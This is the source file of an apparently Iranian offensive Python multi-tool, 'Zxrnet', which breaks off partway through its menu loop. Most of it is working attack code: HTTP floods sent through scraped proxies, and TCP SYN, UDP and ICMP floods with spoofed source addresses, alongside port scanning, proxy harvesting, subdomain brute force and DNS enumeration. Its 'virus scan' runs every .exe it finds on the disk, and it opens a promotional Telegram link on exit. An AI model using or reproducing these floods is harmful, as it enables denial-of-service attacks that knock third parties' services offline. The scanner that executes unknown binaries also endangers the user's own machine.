import requests
import threading
import queue
import random
import string
import socket
import time
import os
import json
import sys
import signal
import webbrowser
import subprocess
import psutil
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from tqdm import tqdm
import logging
from datetime import datetime
import platform
from prettytable import PrettyTable
import art
import dns.resolver
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# تلاش برای وارد کردن scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, RandShort, RandIP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print(colored("[-] Scapy not available. Advanced Layer 3/4 attacks disabled.", "red", attrs=["bold"]))

# تنظیمات لاگ
logging.basicConfig(filename='zxrnet.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# دیتابیس پورت‌ها و سرویس‌ها
SERVICE_PORTS = {
    21: "FTP", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
    110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB", 3389: "RDP",
    8080: "HTTP-Alt", 3306: "MySQL", 5432: "PostgreSQL"
}

# دیتابیس بک‌دورها
BACKDOOR_PORTS = {
    1234: "Netcat Backdoor", 2000: "Back Orifice", 31337: "Back Orifice 2000",
    4444: "Metasploit Default", 5555: "Android ADB Backdoor", 6666: "Common Trojan"
}

# منابع معتبر پروکسی
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://www.proxy-list.download/api/v1/get?type=http"
]

# وردلیست‌های بزرگ برای ساب‌دامین
SUBDOMAIN_WORDLISTS = [
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt",
    "https://raw.githubusercontent.com/rbsec/dnscan/master/subdomains-10000.txt"
]

class Zxrnet:
    def __init__(self):
        """سازنده کلاس Zxrnet با تنظیمات اولیه"""
        self.author = "@amirzxrtop"
        self.version = "6.1.0"
        self.proxies = []
        self.working_proxies = {"http": []}
        self.results_queue = queue.Queue()
        self.backdoor_queue = queue.Queue()
        self.virus_queue = queue.Queue()
        self.subdomain_queue = queue.Queue()
        self.dns_queue = queue.Queue()
        self.link_queue = queue.Queue()
        self.config_file = "zxrnet_config.json"
        self.exit_link = "https://t.me/Assasins_Official"
        self.subdomain_file = "subdomains.txt"
        self.load_config()
        self.clear_screen()
        signal.signal(signal.SIGINT, self.signal_handler)
        self.initialize_logging()

    def initialize_logging(self):
        """تنظیم اولیه لاگ‌گیری"""
        logging.info(f"Zxrnet v{self.version} started by {self.author}")

    def signal_handler(self, sig, frame):
        """مدیریت سیگنال Ctrl+C"""
        print(colored("\n[!] Ctrl+C detected! Saving config and exiting...", "yellow", attrs=["bold", "blink"]))
        self.save_config()
        self.open_exit_link()
        sys.exit(0)

    def clear_screen(self):
        """پاک کردن صفحه کنسول"""
        os.system('cls' if platform.system() == 'Windows' else 'clear')

    def load_config(self):
        """بارگذاری تنظیمات از فایل JSON"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
                self.proxies = self.config.get("proxies", [])
                self.working_proxies = self.config.get("working_proxies", {"http": []})
                print(colored("[+] Configuration loaded successfully", "green", attrs=["bold"]))
                logging.info("Config loaded successfully")
            else:
                self.config = {
                    "proxies": [],
                    "working_proxies": {"http": []},
                    "settings": {"threads": 100, "timeout": 5, "max_retries": 3}
                }
                self.save_config()
                print(colored("[+] New configuration file created", "yellow", attrs=["bold"]))
                logging.info("New config file created")
        except Exception as e:
            logging.error(f"Error loading config: {e}")
            print(colored(f"[-] Error loading config: {e}", "red", attrs=["bold"]))

    def save_config(self):
        """ذخیره تنظیمات در فایل JSON"""
        try:
            self.config["proxies"] = self.proxies
            self.config["working_proxies"] = self.working_proxies
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            print(colored("[+] Configuration saved successfully", "green", attrs=["bold"]))
            logging.info("Config saved successfully")
        except Exception as e:
            logging.error(f"Error saving config: {e}")
            print(colored(f"[-] Error saving config: {e}", "red", attrs=["bold"]))

    def banner(self):
        """نمایش بنر اصلی ابزار با ظاهر زیبا"""
        print(colored(art.text2art("Zxrnet", font="epic"), "cyan", attrs=["bold"]))
        banner_text = f"""
        {'='*60}
        | Created by: {self.author} | Version: {self.version} |
        | Telegram: https://t.me/amirzxrtop                  |
        | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}         |
        | Platform: {platform.system()}                             |
        {'='*60}
        """
        print(colored(banner_text, "cyan", attrs=["bold"]))

    def validate_ip(self, ip):
        """اعتبارسنجی آدرس IP"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def validate_port(self, port):
        """اعتبارسنجی پورت"""
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return True
            print(colored("[-] Port must be between 1 and 65535!", "red", attrs=["bold"]))
            return False
        except ValueError:
            print(colored("[-] Port must be a valid integer!", "red", attrs=["bold"]))
            return False

    def validate_port_range(self, port_range_input):
        """اعتبارسنجی محدوده پورت‌ها"""
        try:
            start, end = map(int, port_range_input.split("-"))
            if 1 <= start <= 65535 and 1 <= end <= 65535 and start <= end:
                return (start, end)
            print(colored("[-] Ports must be between 1-65535 and start <= end!", "red", attrs=["bold"]))
            return None
        except ValueError:
            print(colored("[-] Invalid port range format! Use 'start-end' (e.g., 1-1000)", "red", attrs=["bold"]))
            return None

    def generate_password_list(self, length=12, count=5000, custom_words=None):
        """تولید لیست رمزعبور"""
        self.banner()
        print(colored(f"[*] Generating {count} passwords of length {length}...", "yellow", attrs=["bold"]))
        passwords = set()
        characters = string.ascii_letters + string.digits + string.punctuation
        custom_words = custom_words.split() if custom_words else []
        filename = f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        with tqdm(total=count, desc="Generating Passwords", colour="green") as pbar:
            while len(passwords) < count:
                if custom_words and random.random() > 0.5:
                    base = random.choice(custom_words)
                    pwd = base + ''.join(random.choice(characters) for _ in range(max(0, length - len(base))))
                else:
                    pwd = ''.join(random.choice(characters) for _ in range(length))
                passwords.add(pwd)
                pbar.update(1)

        try:
            with open(filename, 'w') as f:
                f.write("\n".join(passwords))
            print(colored(f"[+] Password list saved to {filename}", "green", attrs=["bold"]))
            self.generate_report(f"Generated {count} passwords and saved to {filename}")
        except Exception as e:
            logging.error(f"Error saving password list: {e}")
            print(colored(f"[-] Error saving password list: {e}", "red", attrs=["bold"]))

    def fetch_proxies(self):
        """دریافت پروکسی‌ها از منابع آنلاین"""
        self.banner()
        print(colored("[*] Fetching proxies from multiple sources...", "yellow", attrs=["bold"]))
        total_collected = 0

        async def fetch_proxy(url):
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status == 200:
                            proxies = (await response.text()).splitlines()
                            return proxies
                        return []
                except Exception as e:
                    logging.error(f"Error fetching proxies from {url}: {e}")
                    print(colored(f"[-] Error fetching proxies from {url}: {e}", "red", attrs=["bold"]))
                    return []

        async def run_fetch():
            tasks = [fetch_proxy(url) for url in PROXY_SOURCES]
            results = await asyncio.gather(*tasks)
            nonlocal total_collected
            for proxies in results:
                self.proxies.extend(proxies)
                total_collected += len(proxies)
                print(colored(f"[+] Collected {len(proxies)} proxies", "cyan", attrs=["bold"]))

        asyncio.run(run_fetch())
        print(colored(f"[+] Total proxies collected: {total_collected}", "green", attrs=["bold"]))
        self.save_config()
        self.generate_report(f"Fetched {total_collected} proxies")

    def test_proxy(self, proxy, proxy_type):
        """تست یک پروکسی"""
        proxy_dict = {proxy_type: f"{proxy_type}://{proxy}"}
        start_time = time.time()
        try:
            response = requests.get("http://www.google.com", proxies=proxy_dict, timeout=self.config["settings"]["timeout"])
            if response.status_code == 200:
                latency = (time.time() - start_time) * 1000
                return (proxy, latency)
            return None
        except Exception:
            return None

    def test_all_proxies(self, threads=100):
        """تست همه پروکسی‌ها"""
        self.banner()
        if not self.proxies:
            print(colored("[-] No proxies available to test!", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Testing {len(self.proxies)} proxies with {threads} threads...", "yellow", attrs=["bold"]))
        proxy_types = ["http"]

        with tqdm(total=len(self.proxies), desc="Testing Proxies", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(self.test_proxy, proxy, proxy_types[0]) for proxy in self.proxies]
                for future in futures:
                    result = future.result()
                    if result:
                        proxy, latency = result
                        self.working_proxies[proxy_types[0]].append((proxy, latency))
                    pbar.update(1)

        table = PrettyTable(["Proxy", "Type", "Latency (ms)"])
        for ptype, proxies in self.working_proxies.items():
            for proxy, latency in proxies:
                table.add_row([proxy, ptype, f"{latency:.2f}"])
            print(colored(f"[+] Found {len(proxies)} working {ptype} proxies", "green", attrs=["bold"]))
            with open(f"working_{ptype}_proxies.txt", "w") as f:
                f.write("\n".join([p[0] for p in proxies]))

        print(table)
        self.save_config()
        self.generate_report(f"Tested {len(self.proxies)} proxies")

    def scan_port(self, target, port, protocol="tcp"):
        """اسکن یک پورت خاص"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                service = SERVICE_PORTS.get(port, "Unknown")
                banner = self.grab_banner(target, port, protocol)
                self.results_queue.put((port, protocol.upper(), "open", service, banner or "No banner"))
            else:
                self.results_queue.put((port, protocol.upper(), "closed", "Unknown", "No response"))
            sock.close()
        except Exception as e:
            logging.error(f"Error scanning port {port}: {e}")

    def grab_banner(self, target, port, protocol):
        """دریافت بنر از پورت"""
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, port))
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                return banner if banner else None
            return None
        except Exception:
            return None

    def scan_ports(self, target, port_range=(1, 1000), threads=100):
        """اسکن پورت‌ها در یک محدوده"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("[-] Invalid IP address!", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Scanning ports on {target} ({port_range[0]}-{port_range[1]})...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Port", "Protocol", "Status", "Service", "Banner"])
        total_ports = (port_range[1] - port_range[0] + 1) * 2

        with tqdm(total=total_ports, desc="Scanning Ports", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in range(port_range[0], port_range[1] + 1):
                    executor.submit(self.scan_port, target, port, "tcp")
                    executor.submit(self.scan_port, target, port, "udp")
                    pbar.update(2)

        open_ports = 0
        while not self.results_queue.empty():
            port, protocol, status, service, banner = self.results_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green", attrs=["bold"]), service, banner])
                open_ports += 1

        if open_ports > 0:
            print(table)
        else:
            print(colored("[!] No open ports found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Scanned ports on {target}. Found {open_ports} open ports")

    def scan_backdoor(self, target, port, protocol="tcp"):
        """اسکن پورت برای بک‌دور"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                banner = self.grab_banner(target, port, protocol)
                backdoor_name = BACKDOOR_PORTS.get(port, "Unknown Backdoor")
                self.backdoor_queue.put((port, protocol.upper(), "open", backdoor_name, banner or "No banner"))
            sock.close()
        except Exception as e:
            logging.error(f"Error scanning backdoor port {port}: {e}")

    def scan_backdoors(self, target, threads=100):
        """اسکن بک‌دورها"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("[-] Invalid IP address!", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Scanning for backdoors on {target}...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Port", "Protocol", "Status", "Backdoor Name", "Banner"])
        total_ports = len(BACKDOOR_PORTS) * 2

        with tqdm(total=total_ports, desc="Scanning Backdoors", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in BACKDOOR_PORTS.keys():
                    executor.submit(self.scan_backdoor, target, port, "tcp")
                    executor.submit(self.scan_backdoor, target, port, "udp")
                    pbar.update(2)

        open_backdoors = 0
        while not self.backdoor_queue.empty():
            port, protocol, status, backdoor_name, banner = self.backdoor_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green", attrs=["bold"]), backdoor_name, banner])
                open_backdoors += 1

        if open_backdoors > 0:
            print(colored("[!] WARNING: Potential backdoors detected!", "red", attrs=["bold"]))
            print(table)
        else:
            print(colored("[+] No backdoors detected!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned backdoors on {target}. Found {open_backdoors} potential backdoors")

    def scan_virus(self, file_path=None):
        """اسکن ویروس"""
        self.banner()
        if file_path:
            if not os.path.exists(file_path) or not file_path.lower().endswith(".exe"):
                print(colored("[-] Invalid file path or not an .exe!", "red", attrs=["bold"]))
                return
            self.analyze_file(file_path)
        else:
            self.scan_system_for_exe()

    def scan_system_for_exe(self):
        """اسکن سیستم برای فایل‌های اجرایی"""
        exe_files = []
        print(colored("[*] Scanning system for .exe files...", "yellow", attrs=["bold"]))
        drives = ['C:\\'] if platform.system() == "Windows" else ['/']
        for drive in drives:
            for root, _, files in os.walk(drive):
                for file in files:
                    if file.lower().endswith(".exe"):
                        exe_files.append(os.path.join(root, file))

        print(colored(f"[+] Found {len(exe_files)} .exe files. Analyzing...", "yellow", attrs=["bold"]))
        with tqdm(total=len(exe_files), desc="Analyzing Files", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(self.analyze_file, exe_files)
                pbar.update(len(exe_files))

        self.display_virus_results()

    def analyze_file(self, file_path):
        """تحلیل فایل برای ویروس"""
        try:
            process = subprocess.Popen([file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
            start_time = time.time()
            suspicious = False
            behavior_score = 0

            while time.time() - start_time < 5:
                cpu_usage = psutil.Process(process.pid).cpu_percent(interval=0.1)
                if cpu_usage > 80:
                    behavior_score += 30
                connections = psutil.Process(process.pid).net_connections()
                if connections:
                    behavior_score += 50
                time.sleep(0.5)

            process.terminate()
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()

            if behavior_score > 50:
                suspicious = True
            self.virus_queue.put((file_path, suspicious, behavior_score))
        except Exception as e:
            logging.error(f"Error analyzing {file_path}: {e}")

    def display_virus_results(self):
        """نمایش نتایج اسکن ویروس"""
        table = PrettyTable(["File Path", "Suspicious", "Behavior Score"])
        suspicious_count = 0

        while not self.virus_queue.empty():
            file_path, suspicious, score = self.virus_queue.get()
            status = colored("Yes", "red", attrs=["bold"]) if suspicious else colored("No", "green", attrs=["bold"])
            table.add_row([file_path, status, score])
            if suspicious:
                suspicious_count += 1

        if suspicious_count > 0:
            print(colored("[!] WARNING: Potential viruses detected!", "red", attrs=["bold"]))
            print(table)
        else:
            print(colored("[+] No suspicious files detected!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned for viruses. Found {suspicious_count} suspicious files")

    def layer7_stress(self, target, duration=60, threads=200, use_proxies=True):
        """استرسر لایه 7"""
        self.banner()
        print(colored(f"[*] Starting Layer 7 attack on {target} for {duration} seconds...", "red", attrs=["bold"]))
        end_time = time.time() + duration
        requests_sent = 0

        async def flood():
            nonlocal requests_sent
            headers = {"User-Agent": random.choice(["Mozilla/5.0", "Chrome/90.0", "Safari/537.36"])}
            async with aiohttp.ClientSession() as session:
                while time.time() < end_time:
                    try:
                        proxy = random.choice([p[0] for p in self.working_proxies["http"]]) if use_proxies and self.working_proxies["http"] else None
                        proxies = {"http": f"http://{proxy}"} if proxy else None
                        async with session.get(target, headers=headers, proxy=proxies["http"] if proxy else None, timeout=aiohttp.ClientTimeout(total=5)) as response:
                            if response.status == 200:
                                requests_sent += 1
                    except:
                        pass

        async def run_flood():
            tasks = [flood() for _ in range(threads)]
            await asyncio.gather(*tasks)

        asyncio.run(run_flood())
        print(colored(f"[+] Layer 7 attack completed. Sent {requests_sent} requests.", "green", attrs=["bold"]))
        self.generate_report(f"Layer 7 attack on {target} for {duration}s. Sent {requests_sent} requests")

    def layer4_stress(self, target, port, duration=60, threads=200, protocol="tcp"):
        """استرسر لایه 4"""
        self.banner()
        if not self.validate_ip(target) or not self.validate_port(port):
            print(colored("[-] Invalid IP or port!", "red", attrs=["bold"]))
            return

        if not SCAPY_AVAILABLE:
            print(colored("[!] Falling back to basic mode (scapy unavailable)...", "yellow", attrs=["bold"]))
            self.basic_layer4_stress(target, port, duration, threads, protocol)
            return

        print(colored(f"[*] Starting Layer 4 {protocol.upper()} attack on {target}:{port}...", "red", attrs=["bold"]))
        end_time = time.time() + duration
        packets_sent = 0

        def flood():
            nonlocal packets_sent
            while time.time() < end_time:
                try:
                    if protocol == "tcp":
                        pkt = IP(dst=target, src=RandIP()) / TCP(dport=port, sport=RandShort(), flags="S")
                    else:
                        pkt = IP(dst=target, src=RandIP()) / UDP(dport=port, sport=RandShort())
                    send(pkt, verbose=False, count=50)
                    packets_sent += 50
                except Exception as e:
                    logging.error(f"Layer 4 error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"[+] Layer 4 {protocol.upper()} attack completed. Sent {packets_sent} packets.", "green", attrs=["bold"]))
        self.generate_report(f"Layer 4 {protocol} attack on {target}:{port} for {duration}s")

    def basic_layer4_stress(self, target, port, duration, threads, protocol):
        """استرسر لایه 4 پایه"""
        end_time = time.time() + duration
        packets_sent = 0

        def flood():
            nonlocal packets_sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    sock.connect((target, port))
                    sock.send(b"FLOOD" * 100)
                    packets_sent += 1
                except:
                    pass
            sock.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"[+] Basic Layer 4 {protocol.upper()} attack completed. Sent {packets_sent} packets.", "green", attrs=["bold"]))
        self.generate_report(f"Basic Layer 4 {protocol} attack on {target}:{port}")

    def layer3_stress(self, target, duration=60, threads=200):
        """استرسر لایه 3"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("[-] Invalid IP address!", "red", attrs=["bold"]))
            return

        if not SCAPY_AVAILABLE:
            print(colored("[!] Falling back to basic mode (scapy unavailable)...", "yellow", attrs=["bold"]))
            self.basic_layer3_stress(target, duration, threads)
            return

        print(colored(f"[*] Starting Layer 3 attack on {target}...", "red", attrs=["bold"]))
        end_time = time.time() + duration
        packets_sent = 0

        def flood():
            nonlocal packets_sent
            while time.time() < end_time:
                try:
                    pkt = IP(dst=target, src=RandIP()) / ICMP() / (b"X" * random.randint(100, 1000))
                    send(pkt, verbose=False, count=30)
                    packets_sent += 30
                except Exception as e:
                    logging.error(f"Layer 3 error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"[+] Layer 3 attack completed. Sent {packets_sent} packets.", "green", attrs=["bold"]))
        self.generate_report(f"Layer 3 attack on {target} for {duration}s")

    def basic_layer3_stress(self, target, duration, threads):
        """استرسر لایه 3 پایه"""
        end_time = time.time() + duration
        packets_sent = 0

        def flood():
            nonlocal packets_sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while time.time() < end_time:
                try:
                    sock.sendto(b"PING" * 100, (target, 0))
                    packets_sent += 1
                except:
                    pass
            sock.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"[+] Basic Layer 3 attack completed. Sent {packets_sent} packets.", "green", attrs=["bold"]))
        self.generate_report(f"Basic Layer 3 attack on {target}")

    def download_subdomain_list(self):
        """دانلود وردلیست ساب‌دامین از منابع معتبر"""
        self.banner()
        print(colored("[*] Downloading subdomain wordlist from GitHub...", "yellow", attrs=["bold"]))
        url = random.choice(SUBDOMAIN_WORDLISTS)
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                with open(self.subdomain_file, "w") as f:
                    f.write(response.text)
                print(colored(f"[+] Subdomain wordlist saved to {self.subdomain_file}", "green", attrs=["bold"]))
                logging.info(f"Downloaded subdomain wordlist from {url}")
            else:
                print(colored(f"[-] Failed to download from {url}: HTTP {response.status_code}", "red", attrs=["bold"]))
        except Exception as e:
            logging.error(f"Error downloading subdomain list: {e}")
            print(colored(f"[-] Error downloading subdomain list: {e}", "red", attrs=["bold"]))

    async def check_subdomain(self, domain, subdomain, session):
        """بررسی وجود ساب‌دامین با DNS به‌صورت غیرهمزمان"""
        full_domain = f"{subdomain}.{domain}"
        try:
            async with session.get(f"http://{full_domain}", timeout=aiohttp.ClientTimeout(total=5)) as response:
                if response.status == 200:
                    answers = dns.resolver.resolve(full_domain, 'A')
                    for rdata in answers:
                        self.subdomain_queue.put((full_domain, str(rdata)))
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout, aiohttp.ClientError):
            pass
        except Exception as e:
            logging.error(f"Error checking subdomain {full_domain}: {e}")

    async def enumerate_subdomains(self, domain, threads=100, limit=20000):
        """پیدا کردن ساب‌دامین‌ها به‌صورت غیرهمزمان"""
        self.banner()
        if not domain:
            print(colored("[-] Domain is required!", "red", attrs=["bold"]))
            return

        if not os.path.exists(self.subdomain_file):
            print(colored("[-] Subdomain wordlist not found! Downloading...", "yellow", attrs=["bold"]))
            self.download_subdomain_list()

        with open(self.subdomain_file, "r") as f:
            subdomains = [line.strip() for line in f if line.strip()][:limit]

        print(colored(f"[*] Enumerating subdomains for {domain} with {threads} threads...", "yellow", attrs=["bold"]))
        total_subdomains = len(subdomains)
        found_subdomains = 0

        table = PrettyTable(["Subdomain", "IP Address"])
        result_file = f"subdomains_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        async def run_checks():
            async with aiohttp.ClientSession() as session:
                tasks = [self.check_subdomain(domain, subdomain, session) for subdomain in subdomains]
                for task in tqdm(asyncio.as_completed(tasks), total=total_subdomains, desc="Enumerating Subdomains", colour="green"):
                    await task

        loop = asyncio.get_event_loop()
        if loop.is_running():
            await run_checks()
        else:
            asyncio.run(run_checks())

        while not self.subdomain_queue.empty():
            subdomain, ip = self.subdomain_queue.get()
            table.add_row([subdomain, ip])
            found_subdomains += 1
            with open(result_file, "a") as f:
                f.write(f"{subdomain}: {ip}\n")

        if found_subdomains > 0:
            print(colored(f"[+] Found {found_subdomains} subdomains!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No subdomains found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Enumerated subdomains for {domain}. Found {found_subdomains} subdomains")

    def dns_bruteforce(self, domain, record_types=["A", "MX", "NS", "TXT"]):
        """بررسی رکوردهای DNS"""
        self.banner()
        if not domain:
            print(colored("[-] Domain is required!", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Performing DNS bruteforce on {domain}...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Record Type", "Value"])
        found_records = 0

        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                for rdata in answers:
                    self.dns_queue.put((rtype, str(rdata)))
                    found_records += 1
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
                continue
            except Exception as e:
                logging.error(f"Error checking DNS {rtype} for {domain}: {e}")

        result_file = f"dns_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.dns_queue.empty():
            rtype, value = self.dns_queue.get()
            table.add_row([rtype, value])
            with open(result_file, "a") as f:
                f.write(f"{rtype}: {value}\n")

        if found_records > 0:
            print(colored(f"[+] Found {found_records} DNS records!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No DNS records found!", "yellow", attrs=["bold"]))
        self.generate_report(f"DNS bruteforce on {domain}. Found {found_records} records")

    async def crawl_page(self, url, session, depth, max_depth, visited, semaphore):
        """خزیدن در صفحه وب به‌صورت غیرهمزمان"""
        if depth > max_depth or url in visited:
            return
        async with semaphore:
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status == 200:
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')
                        visited.add(url)
                        for link in soup.find_all('a', href=True):
                            href = urljoin(url, link['href'])
                            if href.startswith('http'):
                                self.link_queue.put((url, href))
            except Exception as e:
                logging.error(f"Error crawling {url}: {e}")

    async def web_crawler(self, url, max_depth=2, threads=50):
        """خزیدن در وب‌سایت با مدیریت منابع"""
        self.banner()
        if not url.startswith("http"):
            url = f"http://{url}"

        print(colored(f"[*] Crawling {url} with max depth {max_depth} and {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Source URL", "Found Link"])
        found_links = 0
        visited = set()

        semaphore = asyncio.Semaphore(threads)  # محدود کردن تعداد درخواست‌های همزمان

        async def run_crawl():
            async with aiohttp.ClientSession() as session:
                tasks = [self.crawl_page(url, session, 0, max_depth, visited, semaphore)]
                depth = 1
                while depth <= max_depth and tasks:
                    await asyncio.gather(*tasks)
                    new_tasks = []
                    while not self.link_queue.empty():
                        source, link = self.link_queue.get()
                        if link not in visited:
                            new_tasks.append(self.crawl_page(link, session, depth, max_depth, visited, semaphore))
                    tasks = new_tasks[:threads]  # محدود کردن تعداد وظایف در هر عمق
                    depth += 1

        loop = asyncio.get_event_loop()
        if loop.is_running():
            await run_crawl()
        else:
            asyncio.run(run_crawl())

        result_file = f"crawl_{url.split('//')[1].replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.link_queue.empty():
            source, link = self.link_queue.get()
            if link not in visited:
                table.add_row([source, link])
                found_links += 1
                visited.add(link)
                with open(result_file, "a") as f:
                    f.write(f"{source} -> {link}\n")

        if found_links > 0:
            print(colored(f"[+] Found {found_links} unique links!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No links found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Web crawl on {url}. Found {found_links} unique links")

    def ip_geolocation(self, ip):
        """پیدا کردن اطلاعات جغرافیایی IP"""
        self.banner()
        if not self.validate_ip(ip):
            print(colored("[-] Invalid IP address!", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Fetching geolocation for {ip}...", "yellow", attrs=["bold"]))
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data["status"] == "success":
                    table = PrettyTable(["Field", "Value"])
                    fields = ["country", "regionName", "city", "lat", "lon", "isp", "org"]
                    for field in fields:
                        table.add_row([field, data.get(field, "N/A")])
                    print(colored("[+] Geolocation data found!", "green", attrs=["bold"]))
                    print(table)
                    self.generate_report(f"Geolocation for {ip}: {data['country']}, {data['city']}")
                else:
                    print(colored("[!] Failed to get geolocation data!", "red", attrs=["bold"]))
            else:
                print(colored(f"[-] HTTP error: {response.status_code}", "red", attrs=["bold"]))
        except Exception as e:
            logging.error(f"Error fetching geolocation for {ip}: {e}")
            print(colored(f"[-] Error: {e}", "red", attrs=["bold"]))

    def generate_report(self, message):
        """تولید گزارش"""
        try:
            with open("zxrnet_report.txt", "a") as f:
                f.write(f"[{datetime.now()}] {message}\n")
            logging.info(message)
        except Exception as e:
            logging.error(f"Error writing report: {e}")

    def open_exit_link(self):
        """باز کردن لینک خروج"""
        try:
            webbrowser.open(self.exit_link)
        except Exception:
            if platform.system() == "Windows":
                os.system(f"start {self.exit_link}")
            elif platform.system() == "Linux":
                os.system(f"xdg-open {self.exit_link} || termux-open-url {self.exit_link}")
            else:
                os.system(f"termux-open-url {self.exit_link} || xdg-open {self.exit_link}")

    def display_menu(self):
        """نمایش منوی اصلی"""
        self.banner()
        options = [
            "1. Generate Password List",
            "2. Fetch Proxies",
            "3. Test Proxies",
            "4. Scan Ports",
            "5. Scan Backdoors",
            "6. Scan Virus",
            "7. Layer 7 Stress",
            "8. Layer 4 Stress",
            "9. Layer 3 Stress",
            "10. Enumerate Subdomains",
            "11. DNS Bruteforce",
            "12. Web Crawler",
            "13. IP Geolocation",
            "14. Exit"
        ]
        print(colored("Available Options:", "cyan", attrs=["bold", "underline"]))
        print("\n".join(colored(opt, "cyan", attrs=["bold"]) for opt in options))

    def get_user_input(self, prompt, default=None):
        """دریافت ورودی کاربر"""
        value = input(colored(f"{prompt} [{'default' if default else 'required'}]: ", "yellow", attrs=["bold"]))
        return value if value else default

    def run(self):
        """اجرای حلقه اصلی"""
        while True:
            self.display_menu()
            choice = self.get_user_input("Select an option", None)

            try:
                if choice == "1":
                    length = int(self.get_user_input("Password length", "12"))
                    count = int(self.get_user_input("Number of passwords", "5000"))
                    custom_words = self.get_user_input("Custom words (space-separated)", None)
                    self.generate_password_list(length, count, custom_words)

                elif choice == "2":
                    self.fetch_proxies()

                elif choice == "3":
                    threads = int(self.get_user_input("Number of threads", str(self.config["settings"]["threads"])) or self.config["settings"]["threads"])
                    self.test_all_proxies(threads)

                elif choice == "4":
